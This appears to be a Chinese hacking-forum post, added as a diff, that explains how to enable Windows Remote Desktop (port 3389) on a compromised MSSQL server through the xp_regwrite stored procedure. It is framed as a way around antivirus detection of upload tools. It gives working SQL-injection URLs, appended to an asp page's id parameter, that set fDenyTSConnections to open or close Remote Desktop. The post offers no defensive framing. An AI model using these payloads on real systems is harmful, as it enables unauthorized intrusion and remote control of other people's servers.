@@ -1,0 +1,17 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+SQL语句直接开启3389
+D8888D主贴内容-------------------------------------------------------
+其实就是利用MSSQL的存储过程xp_regwrite 。大家在渗透MSSQL服务器的时候，苦于无法上传开3389工具和3389工具不免杀时，可以使用此招轻松开启3389。
+
+
+3389登陆关键注册表位置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections 
+其中键值DenyTSConnections 直接控制着3389的开启和关闭。当该键值为0表示3389开启，1则表示关闭。而MSSQL的xp_regwrite的存储过程可以对注册进行修改。我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。
+
+开启3389的SQL语句：
+syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--
+
+
+关闭3389的SQL语句：
+syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;--
